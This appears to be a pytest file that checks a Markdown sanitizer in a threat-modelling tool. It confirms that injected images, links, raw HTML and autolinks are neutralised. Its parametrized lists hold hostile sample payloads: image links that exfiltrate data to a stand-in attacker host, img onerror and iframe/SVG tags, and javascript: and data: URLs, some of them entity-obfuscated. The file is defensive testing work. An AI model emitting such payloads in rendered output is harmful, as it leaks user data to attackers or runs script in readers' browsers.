"""Security properties of the Markdown boundary, checked by reparsing output."""

import pytest
from markdown_it import MarkdownIt
from markdown_it.tree import SyntaxTreeNode

from stride_gpt.core.markdown_safety import sanitize_markdown
from stride_gpt.core.report_utils import threat_table_row


def _nodes(markdown):
    root = SyntaxTreeNode(MarkdownIt("commonmark", {"html": True}).enable("table").parse(markdown))
    return list(root.walk())


@pytest.mark.parametrize("payload", [
    "![diagram](https://attacker.invalid/?data=SOURCE)",
    "![diagram][ref]\n\n[ref]: https://attacker.invalid/?data=SOURCE",
    "[![nested](https://attacker.invalid/image)](https://attacker.invalid/link)",
    "![escaped \\] label](<https://attacker.invalid/image>)",
    "[![nested][image]][link]\n\n[image]: https://attacker.invalid/i\n[link]: https://attacker.invalid/l",
    '<img src="https://attacker.invalid/image" onerror="alert(1)">',
    '<iframe src="https://attacker.invalid/frame"></iframe>',
    '<svg><image href="https://attacker.invalid/image"/></svg>',
    '[click](javascript:alert(1)) [data](data:text/html;base64,QQ==)',
    '[click](java&#x73;cript:alert(1))',
    '<https://attacker.invalid/link>',
    '![x](//attacker.invalid/image)',
    '![x](data:image/svg+xml;base64,QQ==)',
    '![x](/relative-image)',
])
def test_no_active_resources_or_links_survive(payload):
    output = sanitize_markdown(payload)
    kinds = {node.type for node in _nodes(output)}
    assert not kinds.intersection({"image", "link", "html_inline", "html_block"})
    assert sanitize_markdown(output) == output


def test_structural_markdown_is_preserved():
    text = """## Findings

1. **First** finding
2. A *second* finding

> Analyst note

| Scenario | Impact |
| --- | --- |
| Injection | Disclosure |

```python
print("![not an image](https://attacker.invalid)")
```
"""
    output = sanitize_markdown(text)
    nodes = _nodes(output)
    kinds = {node.type for node in nodes}
    assert {"heading", "ordered_list", "strong", "em", "blockquote", "table", "fence"} <= kinds
    assert not kinds.intersection({"image", "link", "html_inline", "html_block"})
    assert next(n for n in nodes if n.type == "fence").content == 'print("![not an image](https://attacker.invalid)")\n'
    assert sanitize_markdown(output) == output


def test_fences_containing_backticks_cannot_escape_code():
    text = '~~~~html\n```\n<img src="https://attacker.invalid/x">\n~~~~'
    output = sanitize_markdown(text)
    assert {n.type for n in _nodes(output)} == {"root", "fence"}
    assert sanitize_markdown(output) == output


def test_literal_cells_cannot_create_markdown_images_or_html():
    row = threat_table_row(
        {"Threat Type": "Tampering", "Scenario": '![leak](https://attacker.invalid/x) <img src=x>',
         "Potential Impact": "a | b\nnew row"},
        False, False, False, False,
    )
    table = "| Type | Scenario | Impact |\n| --- | --- | --- |\n" + row
    kinds = {node.type for node in _nodes(table)}
    assert "table" in kinds
    assert not kinds.intersection({"image", "link", "html_inline", "html_block"})
    assert len([node for node in _nodes(table) if node.type == "tr"]) == 2


def test_repeated_sanitizing_tables_with_inline_code_preserves_shape():
    text = "| Code | Text |\n| --- | --- |\n| `a\\|b` | literal \\![x](https://example.invalid) |"
    output = sanitize_markdown(text)
    assert len([n for n in _nodes(output) if n.type == "td"]) == 2
    assert sanitize_markdown(output) == output


@pytest.mark.parametrize("payload, literal", [
    ("<https://attacker.invalid/?data=SOURCE>", "https://attacker.invalid/?data=SOURCE"),
    ("Visit https://attacker.invalid/?data=SOURCE now", "https://attacker.invalid/?data=SOURCE"),
    ("[https://attacker.invalid](https://other.invalid)", "https://attacker.invalid"),
    ("www.attacker.invalid/source", "www.attacker.invalid/source"),
    ("WWW.ATTACKER.INVALID/source", "WWW.ATTACKER.INVALID/source"),
    ("user+source@attacker.invalid", "user+source@attacker.invalid"),
    ("<user@attacker.invalid>", "user@attacker.invalid"),
    ("mailto:source@attacker.invalid", "mailto:source@attacker.invalid"),
    ("xmpp:source@attacker.invalid", "xmpp:source@attacker.invalid"),
    ("https&#58;//attacker.invalid", "https://attacker.invalid"),
    ("user&#64;attacker.invalid", "user@attacker.invalid"),
    ("www&#46;attacker.invalid", "www.attacker.invalid"),
    ("[www.attacker.invalid][ref]\n\n[ref]: https://other.invalid", "www.attacker.invalid"),
    ("**www.attacker.invalid**", "www.attacker.invalid"),
    ("| Address |\n| --- |\n| user@attacker.invalid |", "user@attacker.invalid"),
])
def test_gfm_autolink_candidates_are_code_not_relinkable_text(payload, literal):
    output = sanitize_markdown(payload)
    nodes = _nodes(output)
    # GFM's autolink extension operates on text, not code spans. Confirm
    # the meaningful address survived exactly but is no longer text.
    assert literal in [node.content for node in nodes if node.type == "code_inline"]
    assert not any(literal in node.content for node in nodes if node.type == "text")
    assert not {node.type for node in nodes}.intersection({"link", "image"})
    assert sanitize_markdown(output) == output


def test_autolink_with_backticks_cannot_escape_the_literal_span():
    payload = "https://attacker.invalid/`![leak](https://other.invalid)`"
    output = sanitize_markdown(payload)
    assert not {node.type for node in _nodes(output)}.intersection({"link", "image"})
    assert sanitize_markdown(output) == output
